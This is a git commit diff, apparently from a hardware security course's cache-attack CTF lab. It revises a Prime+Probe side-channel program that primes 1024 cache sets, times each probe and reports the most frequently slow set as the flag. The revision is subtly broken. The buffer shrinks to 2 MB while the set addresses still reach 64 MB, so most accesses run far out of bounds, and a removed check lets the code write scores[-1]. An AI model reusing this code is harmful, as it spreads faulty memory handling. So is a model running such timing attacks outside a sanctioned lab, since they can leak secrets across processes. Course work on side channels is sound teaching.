faecabeea3571ed78dce7994ac7a569888961ab9
Brenton Lian <brenton.lian@gmail.com>
2026-03-05 21:53:25 -0500

    iteration 8

--- hwsec-course/lab-cacheattacks/Part3-CTF/attacker.c
+++ hwsec-course/lab-cacheattacks/Part3-CTF/attacker.c
@@ -3,12 +3,12 @@
 #include <stdint.h>
 #include <stdio.h>
 
-#define BUFF_SIZE (NUM_SETS * 65536)
+#define BUFF_SIZE (2*1024*1024)
 #define NUM_SETS 1024
 #define STRIDE 65536
-#define ROUNDS 500
+#define ROUNDS 1000
 
-int main(int argc, char const *argv[]) {
+int main() {
 
     int flag = -1;
 
@@ -26,53 +26,45 @@ int main(int argc, char const *argv[]) {
     buf[0] = 1;
 
     char *set_addr[NUM_SETS];
-    uint64_t scores[NUM_SETS] = {0};
+    uint64_t times[NUM_SETS];
+    int scores[NUM_SETS] = {0};
 
-    for (int i = 0; i < NUM_SETS; i++) {
+    for (int i = 0; i < NUM_SETS; i++)
         set_addr[i] = buf + i * STRIDE;
-    }
 
     for (int round = 0; round < ROUNDS; round++) {
 
         // PRIME
-        for (int i = 0; i < NUM_SETS; i++) {
+        for (int i = 0; i < NUM_SETS; i++)
             *(volatile char*)set_addr[i];
-        }
 
-        // small delay
         for (volatile int i = 0; i < 100000; i++);
 
         // PROBE
+        for (int i = 0; i < NUM_SETS; i++)
+            times[i] = measure_one_block_access_time((ADDR_PTR)set_addr[i]);
+
         uint64_t max_time = 0;
-        int candidate = -1;
+        int slow_set = -1;
 
         for (int i = 0; i < NUM_SETS; i++) {
-
-            uint64_t t = measure_one_block_access_time((ADDR_PTR)set_addr[i]);
-
-            if (t > max_time) {
-                max_time = t;
-                candidate = i;
+            if (times[i] > max_time) {
+                max_time = times[i];
+                slow_set = i;
             }
         }
 
-        if (candidate >= 0) {
-            scores[candidate]++;
-        }
+        scores[slow_set]++;
     }
 
-    // find most frequent candidate
-    int best_set = 0;
-    uint64_t best_score = 0;
+    int best_score = 0;
 
     for (int i = 0; i < NUM_SETS; i++) {
         if (scores[i] > best_score) {
             best_score = scores[i];
-            best_set = i;
+            flag = i;
         }
     }
-
-    flag = best_set;
 
     printf("Flag: %d\n", flag);
 
